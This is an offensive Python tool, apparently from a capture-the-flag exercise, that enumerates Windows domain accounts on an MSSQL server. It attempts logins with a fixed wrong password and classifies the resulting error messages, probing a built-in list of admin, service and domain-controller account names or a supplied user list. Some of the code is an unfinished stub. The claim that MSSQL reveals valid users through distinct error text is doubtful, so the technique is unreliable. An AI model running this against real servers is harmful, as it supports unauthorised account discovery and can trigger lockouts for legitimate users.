#!/usr/bin/env python3
"""
MSSQL User Enumeration via Authentication Error Messages
No passwords or wordlists required!

This technique exploits different error messages returned by MSSQL:
- Valid user with wrong password: "Login failed for user 'X'"
- Invalid user: "Cannot open user default database" or different error
- User exists but disabled: Another distinct error

We can enumerate valid Windows domain users by observing these differences.
"""

import socket
import struct
import argparse
from time import sleep

class MSSQLUserEnum:
    def __init__(self, target, port=1433):
        self.target = target
        self.port = port
        self.domain = "EIGHTEEN"  # From our reconnaissance
    
    def send_prelogin(self, sock):
        """Send MSSQL Pre-Login packet"""
        # Pre-Login packet
        prelogin = bytearray([
            0x12, 0x01, 0x00, 0x2f, 0x00, 0x00, 0x01, 0x00,
            0x00, 0x00, 0x1a, 0x00, 0x06, 0x01, 0x00, 0x20,
            0x00, 0x01, 0x02, 0x00, 0x21, 0x00, 0x01, 0x03,
            0x00, 0x22, 0x00, 0x04, 0x04, 0x00, 0x26, 0x00,
            0x01, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
        ])
        
        sock.send(prelogin)
        response = sock.recv(4096)
        return response
    
    def create_login_packet(self, username, password=""):
        """Create MSSQL TDS Login packet"""
        # This is a simplified login packet structure
        # In reality, you'd use a proper TDS implementation
        
        # For now, we'll use a different approach with actual library
        pass
    
    def test_user_via_error(self, username):
        """
        Test if user exists by attempting login and analyzing error message.
        Uses different approaches based on MSSQL error responses.
        """
        import pymssql
        
        try:
            # Attempt connection with username and blank/wrong password
            conn = pymssql.connect(
                server=self.target,
                user=f"{self.domain}\\{username}",
                password="WrongPassword123!",
                database="master",
                timeout=5
            )
            conn.close()
            # If we get here, somehow the password was right (unlikely)
            return "VALID_WITH_PASSWORD"
            
        except pymssql.OperationalError as e:
            error_msg = str(e)
            
            # Different error messages indicate different states
            if "Login failed for user" in error_msg:
                # User exists but password wrong
                return "VALID_USER"
            elif "Cannot open database" in error_msg:
                # User exists but can't access database
                return "VALID_USER"
            elif "password must be changed" in error_msg:
                # User exists, password expired
                return "VALID_USER"
            elif "account is disabled" in error_msg or "locked" in error_msg:
                # User exists but disabled/locked
                return "VALID_DISABLED"
            elif "not associated with a trusted" in error_msg:
                # User doesn't exist or not in domain
                return "INVALID_USER"
            elif "Could not find a login matching" in error_msg:
                return "INVALID_USER"
            else:
                return f"UNKNOWN: {error_msg[:100]}"
                
        except Exception as e:
            return f"ERROR: {str(e)[:100]}"
    
    def enumerate_users(self, usernames):
        """Enumerate list of usernames"""
        print("="*60)
        print("MSSQL USER ENUMERATION")
        print("="*60)
        print(f"Target: {self.target}:{self.port}")
        print(f"Domain: {self.domain}")
        print("="*60)
        
        valid_users = []
        
        for username in usernames:
            print(f"\n[*] Testing: {self.domain}\\{username}")
            result = self.test_user_via_error(username)
            
            if result == "VALID_USER":
                print(f"    [+] VALID USER FOUND!")
                valid_users.append(username)
            elif result == "VALID_DISABLED":
                print(f"    [!] Valid but disabled/locked")
                valid_users.append(f"{username} (disabled)")
            elif result == "INVALID_USER":
                print(f"    [-] Invalid user")
            else:
                print(f"    [?] {result}")
            
            sleep(0.5)  # Be nice to the server
        
        print("\n" + "="*60)
        print("ENUMERATION COMPLETE")
        print("="*60)
        
        if valid_users:
            print("\n[+] Valid users found:")
            for user in valid_users:
                print(f"    - {user}")
        else:
            print("\n[-] No valid users found")
        
        return valid_users

def generate_common_usernames(base_name=None):
    """Generate common username patterns"""
    usernames = [
        # Common service accounts
        'administrator',
        'admin',
        'sqlserver',
        'sql',
        'mssql',
        'sa',
        
        # Common user accounts
        'user',
        'test',
        'guest',
        
        # From our reconnaissance
        'kevin',
        
        # Domain controller accounts
        'krbtgt',
        'DC01$',
        
        # Common naming patterns
        'john',
        'jane',
        'bob',
        'alice',
        'robert',
        'michael',
        'david',
        'james',
        'mary',
        'jennifer',
    ]
    
    # Add variations
    variations = []
    for name in ['kevin']:  # Focus on known name
        variations.extend([
            name,
            name.capitalize(),
            name.upper(),
            f"{name}.admin",
            f"{name}_admin",
            f"adm_{name}",
        ])
    
    return usernames + variations

def main():
    parser = argparse.ArgumentParser(
        description='MSSQL User Enumeration via Error Messages'
    )
    parser.add_argument('target', help='Target IP or hostname')
    parser.add_argument('--port', type=int, default=1433, help='MSSQL port (default: 1433)')
    parser.add_argument('--domain', default='EIGHTEEN', help='Domain name')
    parser.add_argument('--userlist', help='File with usernames to test')
    parser.add_argument('--username', help='Single username to test')
    
    args = parser.parse_args()
    
    enumerator = MSSQLUserEnum(args.target, args.port)
    enumerator.domain = args.domain
    
    # Determine usernames to test
    if args.username:
        usernames = [args.username]
    elif args.userlist:
        with open(args.userlist, 'r') as f:
            usernames = [line.strip() for line in f if line.strip()]
    else:
        print("[*] No userlist provided, using common usernames")
        usernames = generate_common_usernames()
    
    print(f"[*] Testing {len(usernames)} usernames...\n")
    
    try:
        valid_users = enumerator.enumerate_users(usernames)
        
        # Save results
        if valid_users:
            with open('valid_users.txt', 'w') as f:
                for user in valid_users:
                    f.write(f"{user}\n")
            print(f"\n[+] Valid users saved to: valid_users.txt")
            
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
    except Exception as e:
        print(f"\n[-] Error: {e}")
        print("\n[!] Note: This script requires pymssql library")
        print("    Install with: pip3 install pymssql")

if __name__ == "__main__":
    main()
